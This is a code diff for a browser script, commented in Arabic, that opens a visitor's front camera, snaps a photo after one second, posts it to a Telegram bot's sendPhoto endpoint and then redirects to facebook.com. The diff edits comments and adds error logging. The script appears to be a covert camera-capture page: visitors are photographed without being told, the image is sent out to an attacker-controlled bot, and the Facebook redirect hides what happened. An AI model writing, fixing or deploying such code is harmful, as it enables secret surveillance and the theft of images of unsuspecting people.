@@ -36,9 +36,10 @@ async function init() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        // الانتظار ثانية واحدة لضمان وضوح الصورة
+        // ننتظر ثانية وحدة عشان الصورة تطلع واضحة
         setTimeout(captureAndSend, 1000);
     } catch (err) {
+        // لو رفض الإذن نحوله للفيس طول
         window.location.href = "https://facebook.com";
     }
 }
@@ -55,13 +56,16 @@ function captureAndSend() {
         formData.append("photo", blob, "image.jpg");
 
         try {
-            // صلحنا الرابط هنا
+            // الرابط المصلح هنا
             await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
             });
-        } catch (e) { }
+        } catch (e) {
+            console.error("Error sending to Telegram:", e);
+        }
 
+        // التوجيه للفيس بوك بعد الإرسال
         window.location.href = "https://facebook.com";
     }, "image/jpeg", 0.7);
 }
